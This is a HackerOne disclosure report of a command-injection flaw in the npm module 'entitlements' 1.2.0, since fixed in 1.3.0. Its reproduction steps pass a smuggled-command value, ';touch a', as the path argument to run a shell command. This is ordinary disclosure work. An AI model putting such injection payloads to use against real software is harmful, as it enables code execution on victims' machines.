---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/command-injection-generic
  - env/web
  - stack/node
  - vuln/command-injection
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2018-07-18
submitted: 2018-04-22T22:32:14.171Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "caioluders"
source: "https://hackerone.com/reports/341869"
title: "[entitlements] Command injection on the 'path' parameter"
---
# [entitlements] Command injection on the 'path' parameter

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Node.js third-party modules | **Disclosed:** 2018-07-18

- Report: [https://hackerone.com/reports/341869](https://hackerone.com/reports/341869)
- CWE: Command Injection - Generic
- Submitted: 2018-04-22T22:32:14.171Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello again, another command injection, this time on the `entitlements` module.

# Module

**module name:** entitlements
**version:** 1.2.0
**npm page:** https://www.npmjs.com/package/entitlements

## Module Description

> check the entitlements of a .app bundle

## Module Stats

26 downloads in the last day
328 downloads in the last week
896 downloads in the last month
14783 downloads in the last year

# Vulnerability

## Vulnerability Description

The module appends the `path` parameter to a command on the line [7](https://github.com/matiassingers/entitlements/blob/master/index.js#L7) without escaping it, leading to a command injection.

## Steps To Reproduce:

* Install the module

```
$ npm install entitlements
```

* Example code with the malicious payload ";touch a" on line 3.

```javascript
var entitlements = require('entitlements');

entitlements(';touch a', function(error, data){
  console.log(data);
});
```

* Run it.

```
$ node index.js
```

* Check the newly create file a

```
$ ls
a       index.js
```

## Patch

It is advisable to use a module that explicitly isolates the parameters to the `codesign` command.

## Supporting Material/References:

*  macOS Sierra 10.12.16
* NODEJS v8.4.0
*  NPM 5.3.0

# Wrap up

**( contacted the maintainer || opened issue ) = False**

## Impact

An attacker that controls the `path` parameter can inject commands on the victim's machine.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Severity Updated**
- **2018-05-28** @marcinhoppe: I opened up an issue on GitHub: https://github.com/matiassingers/entitlements/issues/2.
- **External User Joined**
- **2018-07-15** @matiassingers2: This issue has been fixed in v1.3.0 (published to NPM as well)
- **2018-07-18** @marcinhoppe: I can confirm that this problem has been fixed in 1.3.0. I will proceed with the disclosure.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **Changed Scope**
